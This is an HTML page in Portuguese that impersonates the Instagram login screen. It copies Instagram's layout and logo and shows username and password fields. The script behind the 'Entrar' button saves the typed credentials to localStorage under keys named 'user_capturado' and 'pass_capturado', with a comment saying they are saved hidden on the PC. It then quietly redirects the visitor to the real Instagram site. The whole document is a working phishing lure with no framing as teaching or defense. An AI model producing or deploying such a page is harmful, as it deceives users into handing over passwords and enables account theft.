<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { 
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; 
            background-color: #fafafa; 
            display: flex; 
            justify-content: center; 
            align-items: center; 
            height: 100vh;
        }
        .container {
            width: 350px;
            display: flex;
            flex-direction: column;
            gap: 10px;
        }
        .login-card {
            background-color: white;
            border: 1px solid #dbdbdb;
            padding: 20px 40px;
            text-align: center;
        }
        .logo {
            margin: 22px auto 12px;
            width: 175px;
            display: block;
        }
        input {
            width: 100%;
            padding: 9px 8px;
            margin-bottom: 6px;
            border: 1px solid #dbdbdb;
            border-radius: 3px;
            background: #fafafa;
            font-size: 12px;
            color: #262626;
        }
        input:focus {
            border: 1px solid #a8a8a8;
            outline: none;
        }
        button {
            width: 100%;
            padding: 7px;
            background-color: #0095f6;
            color: white;
            border: none;
            border-radius: 8px;
            font-weight: 600;
            font-size: 14px;
            cursor: pointer;
            margin-top: 8px;
        }
        button:hover { background-color: #1877f2; }

        .divider {
            display: flex;
            align-items: center;
            margin: 18px 0;
        }
        .line { flex: 1; height: 1px; background-color: #dbdbdb; }
        .or { color: #8e8e8e; font-size: 13px; font-weight: 600; margin: 0 18px; }

        .fb-login { color: #385185; font-size: 14px; font-weight: 600; text-decoration: none; display: block; margin-bottom: 12px; }
        .forgot { color: #00376b; font-size: 12px; text-decoration: none; }

        .signup-box {
            background-color: white;
            border: 1px solid #dbdbdb;
            padding: 20px;
            text-align: center;
            font-size: 14px;
        }
        .signup-box a { color: #0095f6; text-decoration: none; font-weight: 600; }
    </style>
</head>
<body>

<div class="container">
    <div class="login-card">
        <img src="https://img.freepik.com/vetores-premium/instagram-logotipo_976174-11.jpg?semt=ais_hybrid&w=740&q=80" class="logo">
        <br>
        <input type="text" id="user" placeholder="Telefone, nome de usuário ou email">
        <input type="password" id="pass" placeholder="Senha">
        <button onclick="salvar()">Entrar</button>

        <div class="divider">
            <div class="line"></div>
            <div class="or">OU</div>
            <div class="line"></div>
        </div>

        <a href="#" class="fb-login">Entrar com o Facebook</a>
        <a href="#" class="forgot">Esqueceu a senha?</a>
    </div>

    <div class="signup-box">
        Não tem uma conta? <a href="#">Cadastre-se</a>
    </div>
</div>

<script>
    function salvar() {
        const u = document.getElementById('user').value;
        const p = document.getElementById('pass').value;

        if(u && p) {
            // Salva escondido no PC
            localStorage.setItem('user_capturado', u);
            localStorage.setItem('pass_capturado', p);
            
            // Redireciona para o Instagram real
            window.location.href = "https://www.instagram.com";
        } else {
            alert("Senha incorreta ou campos vazios.");
        }
    }
</script>

</body>
</html>
